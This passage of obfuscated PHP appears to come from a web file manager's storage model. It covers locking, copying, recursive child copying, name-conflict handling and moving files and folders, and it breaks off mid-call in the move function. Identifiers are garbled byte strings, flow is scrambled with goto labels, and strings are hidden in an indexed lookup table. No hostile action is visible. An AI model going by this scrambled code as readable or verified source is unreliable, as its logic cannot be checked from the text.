function _lockEvent($Fü–Ê√ñäÒ, $A«ãËÇê¡°, $dÍçäºﬁ’Ö) { $Bﬁ‘ËÓ”ÜŒ =& $_SERVER[’ÿƒ†ïò]; if (!$this->autoLockSet) { return; } foreach ($A«ãËÇê¡° as $DÑ›Æ⁄¬Ëõ) { $bñÔ¿ˆË¢õ = $DÑ›Æ⁄¬Ëõ . $Bﬁ‘ËÓ”ÜŒ[95] . $Fü–Ê√ñäÒ; if ($dÍçäºﬁ’Ö && CacheLock::lockGet($Bﬁ‘ËÓ”ÜŒ[553] . $bñÔ¿ˆË¢õ)) { continue; } $this->_lockKey($bñÔ¿ˆË¢õ, $dÍçäºﬁ’Ö); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($b©Ã¨˘è µ, $dÖ¿€…ﬂÃÃ = 1) { $d¶‡÷ÓÒ®∑ = $_SERVER[’ÿƒ†ïò][553] . md5($b©Ã¨˘è µ); if ($dÖ¿€…ﬂÃÃ) { if (isset(self::$_lockItemArr[$d¶‡÷ÓÒ®∑])) { return; } self::$_lockItemArr[$d¶‡÷ÓÒ®∑] = 1; CacheLock::lock($d¶‡÷ÓÒ®∑, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$d¶‡÷ÓÒ®∑])) { return; } unset(self::$_lockItemArr[$d¶‡÷ÓÒ®∑]); CacheLock::unlock($d¶‡÷ÓÒ®∑); } } public function isParentOf($eÀíÏª£ïÑ, $EøÌÕ¥çÈ√) { goto e„‰•ôﬁ∫Ã; AÁá◊‘´éµ: $Dåèò‚ÂÍﬂ = $F¯ﬁÂ˜ÆΩ‡[$Eﬁ¢äÖïÓ[515]] . $F¯ﬁÂ˜ÆΩ‡[$Eﬁ¢äÖïÓ[397]] . $Eﬁ¢äÖïÓ[47]; $BËûÉƒ«≥é = $c≠´â¿üÕ†[$Eﬁ¢äÖïÓ[515]] . $c≠´â¿üÕ†[$Eﬁ¢äÖïÓ[397]] . $Eﬁ¢äÖïÓ[47]; $bö◊Æ—™’î = strpos($BËûÉƒ«≥é, $Dåèò‚ÂÍﬂ) === 0; goto c‘ÂöÂßô˘; e„‰•ôﬁ∫Ã: $Eﬁ¢äÖïÓ =& $_SERVER[’ÿƒ†ïò]; $F¯ﬁÂ˜ÆΩ‡ = $this->sourceInfo($eÀíÏª£ïÑ); $c≠´â¿üÕ† = $this->sourceInfo($EøÌÕ¥çÈ√); goto AÁá◊‘´éµ; c‘ÂöÂßô˘: return $bö◊Æ—™’î; goto EÙ¢á§⁄åí; EÙ¢á§⁄åí: } private $targetIsDelete = 0; public function copy($FŸâßâ‰Õê, $d‘∏»àÜè◊, $BØ¨®øﬂÖ” = REPEAT_REPLACE, $bé·Œûü°ä = '') { goto BƒÏ€…¡¢ı; BƒÏ€…¡¢ı: $C˘∂Á–Ü¢ù =& $_SERVER[’ÿƒ†ïò]; $eöı⁄ä∞¢Î = $this->sourceInfo($FŸâßâ‰Õê); $D÷Íß°ÿËø = $this->sourceInfo($d‘∏»àÜè◊); goto F∫«⁄–ÑﬂÌ; DÕäÁ¯…éç: $this->updateModifyTime($d‘∏»àÜè◊); return $aÇù“á£éü; goto a∆ıªßµŸ¯; B›∑è∞≈¨˘: $this->lockCopyStart($FŸâßâ‰Õê); $this->lockWriteStart($d‘∏»àÜè◊, $E¬ô¿çÎ•Ø); $c¢ÌòÙ£™· = array($C˘∂Á–Ü¢ù[554] => array(), $C˘∂Á–Ü¢ù[555] => array(), $C˘∂Á–Ü¢ù[556] => array()); goto B“ëﬁÔ¿∏¥; B“ëﬁÔ¿∏¥: $this->targetIsDelete = intval($eöı⁄ä∞¢Î[$C˘∂Á–Ü¢ù[425]]); $B⁄∆Ω ßãÑ = $this->fileNameExistCache($d‘∏»àÜè◊, $eöı⁄ä∞¢Î[$C˘∂Á–Ü¢ù[28]]); $aÇù“á£éü = $this->_copy($FŸâßâ‰Õê, $d‘∏»àÜè◊, $BØ¨®øﬂÖ”, $c¢ÌòÙ£™·, !0, $bé·Œûü°ä); goto c´Àøåı»ù; bÌ≥æ≈üåæ: if ($eöı⁄ä∞¢Î[$C˘∂Á–Ü¢ù[405]] == $C˘∂Á–Ü¢ù[87] && $B⁄∆Ω ßãÑ == $aÇù“á£éü) { $this->folderSizeResetChildren($B⁄∆Ω ßãÑ); } Model($C˘∂Á–Ü¢ù[557])->addAll($c¢ÌòÙ£™·[$C˘∂Á–Ü¢ù[555]], array(), !0); if ($B⁄∆Ω ßãÑ != $aÇù“á£éü || $eöı⁄ä∞¢Î[$C˘∂Á–Ü¢ù[405]] == $C˘∂Á–Ü¢ù[87]) { Model($C˘∂Á–Ü¢ù[558])->eventCopy($aÇù“á£éü); } goto Dàè≠üÊÉ·; F∫«⁄–ÑﬂÌ: if (!$eöı⁄ä∞¢Î || !$D÷Íß°ÿËø || $D÷Íß°ÿËø[$C˘∂Á–Ü¢ù[405]] != $C˘∂Á–Ü¢ù[87]) { return !1; } if ($this->isParentOf($FŸâßâ‰Õê, $d‘∏»àÜè◊)) { return !1; } $E¬ô¿çÎ•Ø = $bé·Œûü°ä ? $bé·Œûü°ä : $eöı⁄ä∞¢Î[$C˘∂Á–Ü¢ù[28]]; goto B›∑è∞≈¨˘; c´Àøåı»ù: $this->_childrenListClear(); $this->lockCopyEnd($FŸâßâ‰Õê); $this->lockWriteEnd($d‘∏»àÜè◊, $E¬ô¿çÎ•Ø); goto bÌ≥æ≈üåæ; Dàè≠üÊÉ·: $this->saveAll($c¢ÌòÙ£™·[$C˘∂Á–Ü¢ù[556]]); Model($C˘∂Á–Ü¢ù[193])->linkAdd($c¢ÌòÙ£™·[$C˘∂Á–Ü¢ù[554]]); $this->folderSizeReset($d‘∏»àÜè◊); goto DÕäÁ¯…éç; a∆ıªßµŸ¯: } private function _copy($e¡∂íΩ⁄≤ü, $a‘Á„†˜…ø, $BœñàÀ»àë, &$C¯Á£Â·Êê, $aÖˆˆÜ©•Ô, $fê¿›ÀÊÔç = '') { goto AÇßôßÏïê; e°µå‡ëç»: $cÂıÒë ⁄« = $fê¿›ÀÊÔç ? $fê¿›ÀÊÔç : $BÁπ∂Íﬂ‡∏[$a¶ã£˘Ì∂ª[28]]; $aô„ƒ¿∫Ç€ = $this->fileNameExistCache($a‘Á„†˜…ø, $cÂıÒë ⁄«); if ($aÖˆˆÜ©•Ô) { $this->_childrenAllMake($e¡∂íΩ⁄≤ü); if ($B  ¯¡ÇùÛ && $aô„ƒ¿∫Ç€) { $this->_childrenAllMake($aô„ƒ¿∫Ç€); } } goto f——‡óáú∫; DàΩá¯ÚêÃ: return $d‹ê‰Ÿ∑¢”; goto fíæ£¶«å©; f——‡óáú∫: if (!$aô„ƒ¿∫Ç€) { return $this->_copyCreate($e¡∂íΩ⁄≤ü, $a‘Á„†˜…ø, $cÂıÒë ⁄«, $C¯Á£Â·Êê); } $d‹ê‰Ÿ∑¢” = $aô„ƒ¿∫Ç€; if ($B  ¯¡ÇùÛ) { if ($BœñàÀ»àë == REPEAT_RENAME_FOLDER) { $cÂıÒë ⁄« = $this->fileNameAutoCache($a‘Á„†˜…ø, $cÂıÒë ⁄«, $BœñàÀ»àë, $B  ¯¡ÇùÛ); $d‹ê‰Ÿ∑¢” = $this->_copyCreate($e¡∂íΩ⁄≤ü, $a‘Á„†˜…ø, $cÂıÒë ⁄«, $C¯Á£Â·Êê); } else { $EäóÃ‘Õàº = $this->_childrenList($e¡∂íΩ⁄≤ü); foreach ($EäóÃ‘Õàº as $eÍ©ò·◊≥ƒ) { $this->_copy($eÍ©ò·◊≥ƒ[$a¶ã£˘Ì∂ª[397]], $aô„ƒ¿∫Ç€, $BœñàÀ»àë, $C¯Á£Â·Êê, !1); } } } else { if ($BœñàÀ»àë == REPEAT_RENAME || $BœñàÀ»àë == REPEAT_RENAME_FOLDER) { $cÂıÒë ⁄« = $this->fileNameAutoCache($a‘Á„†˜…ø, $cÂıÒë ⁄«, $BœñàÀ»àë, $B  ¯¡ÇùÛ); $d‹ê‰Ÿ∑¢” = $this->_copyCreate($e¡∂íΩ⁄≤ü, $a‘Á„†˜…ø, $cÂıÒë ⁄«, $C¯Á£Â·Êê); } else { if ($BœñàÀ»àë == REPEAT_REPLACE) { $dÏ®çÍÇëÇ = $this->sourceInfoCache($aô„ƒ¿∫Ç€); $cÎÒÕŒíÉ° = $this->fileHistory($dÏ®çÍÇëÇ, $BÁπ∂Íﬂ‡∏[$a¶ã£˘Ì∂ª[461]], $BÁπ∂Íﬂ‡∏[$a¶ã£˘Ì∂ª[78]]); if ($cÎÒÕŒíÉ°) { $C¯Á£Â·Êê[$a¶ã£˘Ì∂ª[554]][] = $BÁπ∂Íﬂ‡∏[$a¶ã£˘Ì∂ª[461]]; } } else { if ($BœñàÀ»àë == REPEAT_SKIP) { } } } Hook::trigger($a¶ã£˘Ì∂ª[559], array($a¶ã£˘Ì∂ª[560], $BÁπ∂Íﬂ‡∏, 0)); } goto DàΩá¯ÚêÃ; AÇßôßÏïê: $a¶ã£˘Ì∂ª =& $_SERVER[’ÿƒ†ïò]; $BÁπ∂Íﬂ‡∏ = $this->sourceInfoCache($e¡∂íΩ⁄≤ü); $B  ¯¡ÇùÛ = $BÁπ∂Íﬂ‡∏[$a¶ã£˘Ì∂ª[405]] == $a¶ã£˘Ì∂ª[87]; goto e°µå‡ëç»; fíæ£¶«å©: } private function _copyCreate($dÒ¶»…ôÎº, $dç…≈ÙÜúÍ, $A◊Ô„¢◊öó, &$BÌñë£±∑ª) { goto e–»êÚ◊ëä; e–»êÚ◊ëä: $b öØ¡‘õÖ =& $_SERVER[’ÿƒ†ïò]; $F⁄»ôëë€≠ = $this->sourceInfoCache($dÒ¶»…ôÎº); $b€áÿÎ¯ù™ = $this->sourceInfoCache($dç…≈ÙÜúÍ); goto B‚ìÖÂÜ∂ù; A∫Ë®Ñúâ: $this->addAll($A…ê–È±ó¥, array(), !1); $E‚ΩµƒÑÑ = $this->where(array($b öØ¡‘õÖ[492] => $bè·ã÷–Ç¿))->select(); $d„™Ô˜éäÊ = $this->_childrenMakeRelation($f€âœÏ¯ß, $E‚ΩµƒÑÑ); goto CÛÈˆóØ‰™; Cë¨òÁÍïè: $this->_childrenListAll($dÒ¶»…ôÎº, $f€âœÏ¯ß); $b∞í™‚’Æ∫ = count($f€âœÏ¯ß); if ($b∞í™‚’Æ∫ == 0) { return $bè·ã÷–Ç¿; } goto aÚ¨≥Ò™ü; B‚ìÖÂÜ∂ù: $A∑‡ÇåÈòÎ = $this->_makeItemData($F⁄»ôëë€≠, $b€áÿÎ¯ù™, $A◊Ô„¢◊öó); Hook::trigger($b öØ¡‘õÖ[561], $A∑‡ÇåÈòÎ); Hook::trigger($b öØ¡‘õÖ[562], array($b öØ¡‘õÖ[563], $A∑‡ÇåÈòÎ, 0)); goto D∂¿Ëπ¡≥î; f∫“úÛüÍı: foreach ($E‚ΩµƒÑÑ as $Cº∏¬∂ó–ˆ) { $f÷∫ö«âª© = $Cº∏¬∂ó–ˆ[$b öØ¡‘õÖ[397]]; $e¶µáñö÷÷ = $this->_childrenMatch($d„™Ô˜éäÊ, $Cº∏¬∂ó–ˆ, $aÆ≥º˜Œåë); $e´ìò©ËÒª[] = array($b öØ¡‘õÖ[397], $f÷∫ö«âª©, $b öØ¡‘õÖ[492], $e¶µáñö÷÷[$b öØ¡‘õÖ[492]]); $CùüêËﬁè®[] = array($b öØ¡‘õÖ[397], $f÷∫ö«âª©, $b öØ¡‘õÖ[515], $e¶µáñö÷÷[$b öØ¡‘õÖ[515]]); $this->_copyApplyMeta($Cº∏¬∂ó–ˆ, $BÌñë£±∑ª); if ($Cº∏¬∂ó–ˆ[$b öØ¡‘õÖ[405]] != $b öØ¡‘õÖ[87]) { $BÌñë£±∑ª[$b öØ¡‘õÖ[554]][] = $Cº∏¬∂ó–ˆ[$b öØ¡‘õÖ[461]]; } } $this->chunkEventSet($b öØ¡‘õÖ[566], array($b öØ¡‘õÖ[567], $A∑‡ÇåÈòÎ, $b∞í™‚’Æ∫)); $this->saveAll($e´ìò©ËÒª); goto Cëı‚ÃˆÂ; D∂¿Ëπ¡≥î: $bè·ã÷–Ç¿ = $this->add($A∑‡ÇåÈòÎ); $D©›–—ôü§ = array($b öØ¡‘õÖ[397] => $bè·ã÷–Ç¿, $b öØ¡‘õÖ[28] => $A◊Ô„¢◊öó); $this->_copyApplyMeta($D©›–—ôü§, $BÌñë£±∑ª); goto A÷ó™Ö≠ä€; aÚ¨≥Ò™ü: $aÆ≥º˜Œåë = $this->sourceInfo($bè·ã÷–Ç¿); foreach ($f€âœÏ¯ß as $Cº∏¬∂ó–ˆ) { $AÆ◊¡¬—Á© = $this->_makeItemData($Cº∏¬∂ó–ˆ, $aÆ≥º˜Œåë, $Cº∏¬∂ó–ˆ[$b öØ¡‘õÖ[28]]); $AÆ◊¡¬—Á©[$b öØ¡‘õÖ[515]] = $Cº∏¬∂ó–ˆ[$b öØ¡‘õÖ[515]]; $A…ê–È±ó¥[] = $AÆ◊¡¬—Á©; } $this->chunkEventSet($b öØ¡‘õÖ[564], array($b öØ¡‘õÖ[565], $A∑‡ÇåÈòÎ, $b∞í™‚’Æ∫)); goto A∫Ë®Ñúâ; CÛÈˆóØ‰™: $d„™Ô˜éäÊ[$dÒ¶»…ôÎº] = $bè·ã÷–Ç¿; $e´ìò©ËÒª = array(); $CùüêËﬁè® = array(); goto f∫“úÛüÍı; A÷ó™Ö≠ä€: if ($F⁄»ôëë€≠[$b öØ¡‘õÖ[405]] != $b öØ¡‘õÖ[87]) { $BÌñë£±∑ª[$b öØ¡‘õÖ[554]][] = $F⁄»ôëë€≠[$b öØ¡‘õÖ[461]]; return $bè·ã÷–Ç¿; } $f€âœÏ¯ß = array(); $A…ê–È±ó¥ = array(); goto Cë¨òÁÍïè; Cëı‚ÃˆÂ: $this->chunkEventSet($b öØ¡‘õÖ[568], array($b öØ¡‘õÖ[569], $A∑‡ÇåÈòÎ, $b∞í™‚’Æ∫)); $this->saveAll($CùüêËﬁè®); return $bè·ã÷–Ç¿; goto EÇÁÓß …ƒ; EÇÁÓß …ƒ: } private function _childrenMakeRelation($aää∆≠Üßø, $Eë≠àØ±Ê‚) { $DãÂÁ≤çÚñ =& $_SERVER[’ÿƒ†ïò]; $f√êÁå∏–Â = array(); $FâãûŒÀ·· = array(); foreach ($aää∆≠Üßø as $fãœ∞∏◊ƒ—) { $bæÁﬂ„”à– = $fãœ∞∏◊ƒ—[$DãÂÁ≤çÚñ[28]] . $DãÂÁ≤çÚñ[8] . $fãœ∞∏◊ƒ—[$DãÂÁ≤çÚñ[515]]; $f√êÁå∏–Â[$bæÁﬂ„”à–] = $fãœ∞∏◊ƒ—[$DãÂÁ≤çÚñ[397]]; } foreach ($Eë≠àØ±Ê‚ as $fãœ∞∏◊ƒ—) { $bæÁﬂ„”à– = $fãœ∞∏◊ƒ—[$DãÂÁ≤çÚñ[28]] . $DãÂÁ≤çÚñ[8] . $fãœ∞∏◊ƒ—[$DãÂÁ≤çÚñ[515]]; $e÷ÎÛˆÓë¡ = $f√êÁå∏–Â[$bæÁﬂ„”à–]; $FâãûŒÀ··[$e÷ÎÛˆÓë¡] = $fãœ∞∏◊ƒ—[$DãÂÁ≤çÚñ[397]]; } return $FâãûŒÀ··; } private function _childrenMatch($cÊïíéÛ§¥, $DÿòÀì‰‚ƒ, $CõöòÁ™äï) { goto aí«æÇ‹∂õ; aí«æÇ‹∂õ: $F≠¬ﬁ¢Í¿µ =& $_SERVER[’ÿƒ†ïò]; $a‹®Ñ‚ß“ø = $CõöòÁ™äï[$F≠¬ﬁ¢Í¿µ[515]]; $F‚¿≠™ıîﬂ = $this->parentLevelArray($DÿòÀì‰‚ƒ[$F≠¬ﬁ¢Í¿µ[515]]); goto A§œıè‘π¶; c®´ﬂ¥çê¨: $Dı«Í·Ã¢≈ = $d œê›≈Èé[count($d œê›≈Èé) - 1]; return array($F≠¬ﬁ¢Í¿µ[492] => $Dı«Í·Ã¢≈, $F≠¬ﬁ¢Í¿µ[515] => $a‹®Ñ‚ß“ø); goto BœîÃ◊©—Ï; A§œıè‘π¶: foreach ($F‚¿≠™ıîﬂ as $E´®æëΩ˜†) { if (isset($cÊïíéÛ§¥[$E´®æëΩ˜†])) { $a‹®Ñ‚ß“ø .= $cÊïíéÛ§¥[$E´®æëΩ˜†] . $F≠¬ﬁ¢Í¿µ[570]; } } $a‹®Ñ‚ß“ø = rtrim($a‹®Ñ‚ß“ø, $F≠¬ﬁ¢Í¿µ[47]) . $F≠¬ﬁ¢Í¿µ[47]; $d œê›≈Èé = $this->parentLevelArray($a‹®Ñ‚ß“ø); goto c®´ﬂ¥çê¨; BœîÃ◊©—Ï: } private function _makeItemData($eÜåøø¿¢‰, $b§€…ÆÛ´, $BÆÃ™âÏºÏ) { $a∏§≠Ω¨¢â =& $_SERVER[’ÿƒ†ïò]; $AêøÜË§ÿŸ = array($a∏§≠Ω¨¢â[571] => $eÜåøø¿¢‰[$a∏§≠Ω¨¢â[405]], $a∏§≠Ω¨¢â[415] => $BÆÃ™âÏºÏ, $a∏§≠Ω¨¢â[572] => $eÜåøø¿¢‰[$a∏§≠Ω¨¢â[407]], $a∏§≠Ω¨¢â[462] => $eÜåøø¿¢‰[$a∏§≠Ω¨¢â[461]], $a∏§≠Ω¨¢â[573] => $eÜåøø¿¢‰[$a∏§≠Ω¨¢â[78]], $a∏§≠Ω¨¢â[574] => $b§€…ÆÛ´[$a∏§≠Ω¨¢â[406]], $a∏§≠Ω¨¢â[575] => $b§€…ÆÛ´[$a∏§≠Ω¨¢â[498]], $a∏§≠Ω¨¢â[576] => USER_ID, $a∏§≠Ω¨¢â[577] => USER_ID, $a∏§≠Ω¨¢â[396] => $b§€…ÆÛ´[$a∏§≠Ω¨¢â[397]], $a∏§≠Ω¨¢â[578] => $b§€…ÆÛ´[$a∏§≠Ω¨¢â[515]] . $b§€…ÆÛ´[$a∏§≠Ω¨¢â[397]] . $a∏§≠Ω¨¢â[47], $a∏§≠Ω¨¢â[419] => $eÜåøø¿¢‰[$a∏§≠Ω¨¢â[84]], $a∏§≠Ω¨¢â[424] => 0, $a∏§≠Ω¨¢â[579] => $a∏§≠Ω¨¢â[33]); return $AêøÜË§ÿŸ; } private function _copyApplyMeta($eÁﬁØèπ»Ù, &$CÍ∑âçÚªò) { $F∏ã«©¡çã =& $_SERVER[’ÿƒ†ïò]; $E—åÛ‡á–§ = $eÁﬁØèπ»Ù[$F∏ã«©¡çã[397]]; $bıÀ∂æ»¬» = $eÁﬁØèπ»Ù[$F∏ã«©¡çã[28]]; if (!isset($eÁﬁØèπ»Ù[$F∏ã«©¡çã[580]]) || !$eÁﬁØèπ»Ù[$F∏ã«©¡çã[580]] || $eÁﬁØèπ»Ù[$F∏ã«©¡çã[580]] == $F∏ã«©¡çã[191]) { $CÍ∑âçÚªò[$F∏ã«©¡çã[556]][] = array($F∏ã«©¡çã[397], $E—åÛ‡á–§, $F∏ã«©¡çã[580], short_id($E—åÛ‡á–§)); } if (Input::check($bıÀ∂æ»¬», $F∏ã«©¡çã[581])) { $CÍ∑âçÚªò[$F∏ã«©¡çã[555]][] = array($F∏ã«©¡çã[397] => $E—åÛ‡á–§, $F∏ã«©¡çã[93] => $F∏ã«©¡çã[458], $F∏ã«©¡çã[372] => str_replace($F∏ã«©¡çã[50], $F∏ã«©¡çã[33], Pinyin::get($bıÀ∂æ»¬»))); $CÍ∑âçÚªò[$F∏ã«©¡çã[555]][] = array($F∏ã«©¡çã[397] => $E—åÛ‡á–§, $F∏ã«©¡çã[93] => $F∏ã«©¡çã[457], $F∏ã«©¡çã[372] => Pinyin::get($bıÀ∂æ»¬», $F∏ã«©¡çã[582])); } $CÍ∑âçÚªò[$F∏ã«©¡çã[555]][] = array($F∏ã«©¡çã[397] => $E—åÛ‡á–§, $F∏ã«©¡çã[93] => $F∏ã«©¡çã[436], $F∏ã«©¡çã[372] => KodSort::makeStr($bıÀ∂æ»¬»)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($D©ı¬õÁŒô) { goto eÌ–’§è∂¬; e≠∏¶Õ†¿’: $a∏…ëæÍ≤î = array_to_keyvalue($a∏…ëæÍ≤î, $A‡Ö˘à±◊Ê[397]); foreach ($a∏…ëæÍ≤î as $EÉÖÓ’óﬂ∂) { $Eä≈∑ﬁ«“∫ = $EÉÖÓ’óﬂ∂[$A‡Ö˘à±◊Ê[492]]; $D©ı¬õÁŒô = $EÉÖÓ’óﬂ∂[$A‡Ö˘à±◊Ê[397]]; if (!isset($this->_childrenListCache[$D©ı¬õÁŒô]) && $EÉÖÓ’óﬂ∂[$A‡Ö˘à±◊Ê[405]] == $A‡Ö˘à±◊Ê[87]) { $this->_childrenListCache[$D©ı¬õÁŒô] = array(); } if (!isset($this->_childrenListCache[$Eä≈∑ﬁ«“∫])) { $this->_childrenListCache[$Eä≈∑ﬁ«“∫] = array(); } $this->_childrenListCache[$Eä≈∑ﬁ«“∫][$D©ı¬õÁŒô] = $EÉÖÓ’óﬂ∂; $this->_childrenItemCache[$D©ı¬õÁŒô] = $EÉÖÓ’óﬂ∂; } goto aŸﬂà˘∑›î; d◊Àìê´éú: $BÆŸÉ∫à¿„ = array($A‡Ö˘à±◊Ê[515] => array($A‡Ö˘à±◊Ê[538], $Fï¨èÉŒë [$A‡Ö˘à±◊Ê[515]] . $D©ı¬õÁŒô . $A‡Ö˘à±◊Ê[539]), $A‡Ö˘à±◊Ê[425] => $this->targetIsDelete); $a∏…ëæÍ≤î = $this->field($Fóîâè›Ãã)->where($BÆŸÉ∫à¿„)->select(); if (!$a∏…ëæÍ≤î) { return; } goto e≠∏¶Õ†¿’; eÌ–’§è∂¬: $A‡Ö˘à±◊Ê =& $_SERVER[’ÿƒ†ïò]; $Fï¨èÉŒë  = $this->sourceInfo($D©ı¬õÁŒô); $Fóîâè›Ãã = $A‡Ö˘à±◊Ê[583]; goto d◊Àìê´éú; aŸﬂà˘∑›î: } private function _childrenListAll($D®¯ä≠¨°™, &$F¢äºè†æò) { $DôÇüëä¨ê =& $_SERVER[’ÿƒ†ïò]; if (!isset($this->_childrenListCache[$D®¯ä≠¨°™])) { return; } $dòà¢öíˆ± = $this->_childrenListCache[$D®¯ä≠¨°™]; foreach ($dòà¢öíˆ± as $f±„òüõÍ¶ => $e∏‰‘„¿ŸÃ) { $F¢äºè†æò[$f±„òüõÍ¶] = $e∏‰‘„¿ŸÃ; if ($e∏‰‘„¿ŸÃ[$DôÇüëä¨ê[405]] == $DôÇüëä¨ê[87]) { $this->_childrenListAll($f±„òüõÍ¶, $F¢äºè†æò); } } } private function sourceInfoCache($AîÒÜ–ìöä) { if (isset($this->_childrenItemCache[$AîÒÜ–ìöä])) { return $this->_childrenItemCache[$AîÒÜ–ìöä]; } return $this->sourceInfo($AîÒÜ–ìöä); } private function _childrenList($fï—€éäË¡) { if (isset($this->_childrenListCache[$fï—€éäË¡])) { return $this->_childrenListCache[$fï—€éäË¡]; } return $this->_childrenListSelect($fï—€éäË¡); } private function _childrenListSelect($fã±äπãè£) { goto Aœ‹‹’àÛÍ; Aœ‹‹’àÛÍ: $c£ü¯Â∑Ôî =& $_SERVER[’ÿƒ†ïò]; $få◊Ã√√ä˜ = array($c£ü¯Â∑Ôî[492] => $fã±äπãè£, $c£ü¯Â∑Ôî[425] => $this->targetIsDelete); $a≠±£ñé™† = $this->where($få◊Ã√√ä˜)->select(); goto A”àãÆù‘ò; A”àãÆù‘ò: $a≠±£ñé™† = $a≠±£ñé™† ? $a≠±£ñé™† : array(); $C∆ÑËÚ±π∑ = array_to_keyvalue($a≠±£ñé™†, $c£ü¯Â∑Ôî[397]); $this->_childrenListCache[$fã±äπãè£] = $C∆ÑËÚ±π∑; goto A§æ∑åàØÑ; A§æ∑åàØÑ: foreach ($C∆ÑËÚ±π∑ as $fã±äπãè£ => $a∂‰Œ°ÃùÜ) { $this->_childrenItemCache[$fã±äπãè£] = $a∂‰Œ°ÃùÜ; } return $C∆ÑËÚ±π∑; goto D¨£‘º›Ï…; D¨£‘º›Ï…: } private function fileNameExistCache($FªîÏ“≈µ¢, $dÓ⁄·à‡ìü) { $DïºÚî‚´  =& $_SERVER[’ÿƒ†ïò]; $dÓ⁄·à‡ìü = strtolower($dÓ⁄·à‡ìü); $D¡™≥úÎ™ = $this->_childrenList($FªîÏ“≈µ¢); foreach ($D¡™≥úÎ™ as $AÉèÎíä¨À) { if ($dÓ⁄·à‡ìü == strtolower($AÉèÎíä¨À[$DïºÚî‚´ [28]])) { return $AÉèÎíä¨À[$DïºÚî‚´ [397]]; } } return !1; } private function fileNameAutoCache($D°µ•ºÿÓœ, $fÈ£Œ“åÑˆ, $AŸÂπ…Ωıá, $açüÒÿÌáÜ) { $BŒ¶øÚíú∫ =& $_SERVER[’ÿƒ†ïò]; $F∑’Îﬂ€ˆ» = $this->_childrenList($D°µ•ºÿÓœ); $B€Æ”‰ÆŸ = array_to_keyvalue($F∑’Îﬂ€ˆ», $BŒ¶øÚíú∫[33], $BŒ¶øÚíú∫[28]); return $this->fileNameAutoGet($B€Æ”‰ÆŸ, $fÈ£Œ“åÑˆ, $AŸÂπ…Ωıá, $açüÒÿÌáÜ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($D ê¢Î›‰Ô, $F§ùÂÜÕƒô, $D“∫á¥Ê˜∆ = REPEAT_REPLACE, $FÜƒ∞°ªà = '') { goto FòÂ¿¨¬üß; BõÔØ©ÏΩè: if ($CΩ†º∑Œú«[$fü¥≈‚¥£•[492]] == $AÁñå∆®Ÿ‡[$fü¥≈‚¥£•[397]]) { if ($CΩ†º∑Œú«[$fü¥≈‚¥£•[425]] == $fü¥≈‚¥£•[87]) { Model($fü¥≈‚¥£•[423])->restore(array($D ê¢Î›‰Ô)); } if (!$FÜƒ∞°ªà || $FÜƒ∞°ªà == $CΩ†º∑Œú«[$fü¥≈‚¥£•[28]]) { return $D ê¢Î›‰Ô; } } $DìûÔ§£§Œ = $this->pathInfoMore($D ê¢Î›‰Ô); if ($this->isParentOf($D ê¢Î›‰Ô, $F§ùÂÜÕƒô)) { return !1; } goto e⁄Ú¨èåÕè; cµÁΩûæ˜ø: $this->folderSizeReset($F§ùÂÜÕƒô); $b° ÙŒ…¯¶ = array($CΩ†º∑Œú«[$fü¥≈‚¥£•[492]], $F§ùÂÜÕƒô); if ($CΩ†º∑Œú«[$fü¥≈‚¥£•[405]] == $fü¥≈‚¥£•[87]) { $b° ÙŒ…¯¶[] = $D ê¢Î›‰Ô; } goto aèë≤Ã»ßÕ; aèë≤Ã»ßÕ: $this->updateModifyTime($b° ÙŒ…¯¶); Model($fü¥≈‚¥£•[558])->eventMove($D ê¢Î›‰Ô, $CΩ†º∑Œú«[$fü¥≈‚¥£•[492]], $F§ùÂÜÕƒô); Hook::trigger($fü¥≈‚¥£•[585], $DìûÔ§£§Œ); goto c¢∑¨∏∞Õ§; cµ¯Í¢°º⁄: if ($CΩ†º∑Œú«[$fü¥≈‚¥£•[492]] == $F§ùÂÜÕƒô && $FÜƒ∞°ªà != $CΩ†º∑Œú«[$fü¥≈‚¥£•[28]]) { $Dîÿ §Î±Ù = $this->fileNameExist($F§ùÂÜÕƒô, $FÜƒ∞°ªà); if ($Dîÿ §Î±Ù && $CΩ†º∑Œú«[$fü¥≈‚¥£•[405]] == $fü¥≈‚¥£•[191]) { goto Aá≥‚ìÚæ¨; cÕÒÙä”àä: $this->removeNow($D ê¢Î›‰Ô, !1); $this->folderSizeReset($F§ùÂÜÕƒô); Hook::trigger($fü¥≈‚¥£•[585], $DìûÔ§£§Œ); goto a´õµÑ€≥∏; Aá≥‚ìÚæ¨: $Cû•èÕÜŸé = $this->sourceInfo($Dîÿ §Î±Ù); $b¥‘Õ›‘Ï— = $this->fileHistory($Cû•èÕÜŸé, $CΩ†º∑Œú«[$fü¥≈‚¥£•[461]], $CΩ†º∑Œú«[$fü¥≈‚¥£•[78]]); if (!$b¥‘Õ›‘Ï—) { Model($fü¥≈‚¥£•[464])->remove($CΩ†º∑Œú«[$fü¥≈‚¥£•[461]]); } goto cÕÒÙä”àä; a´õµÑ€≥∏: return $Dîÿ §Î±Ù; goto CÜ»•ãÍéÙ; CÜ»•ãÍéÙ: } } $eÆÖ›Ÿôπ = $FÜƒ∞°ªà ? $FÜƒ∞°ªà : $CΩ†º∑Œú«[$fü¥≈‚¥£•[28]]; $this->lockMoveStart($D ê¢Î›‰Ô); goto f®ÏóÚ≠µ√; FòÂ¿¨¬üß: $fü¥≈‚¥£• =& $_SERVER[’ÿƒ†ïò]; $CΩ†º∑Œú« = $this->sourceInfo($D ê¢Î›‰Ô); $AÁñå∆®Ÿ‡ = $this->sourceInfo($F§ùÂÜÕƒô); goto BõÔØ©ÏΩè; D–’⁄‘˘á≤: $this->lockMoveEnd($D ê¢Î›‰Ô); $this->lockWriteEnd($F§ùÂÜÕƒô, $eÆÖ›Ÿôπ); $this->folderSizeReset($CΩ†º∑Œú«[$fü¥≈‚¥£•[492]]); goto cµÁΩûæ˜ø; e⁄Ú¨èåÕè: if (!$CΩ†º∑Œú« || !$AÁñå∆®Ÿ‡ || $AÁñå∆®Ÿ‡[$fü¥≈‚¥£•[405]] != $fü¥≈‚¥£•[87]) { return !1; } Hook::trigger($fü¥≈‚¥£•[584], $DìûÔ§£§Œ); $this->targetIsDelete = intval($CΩ†º∑Œú«[$fü¥≈‚¥£•[425]]); goto cµ¯Í¢°º⁄; f®ÏóÚ≠µ√: $this->lockWriteStart($F§ùÂÜÕƒô, 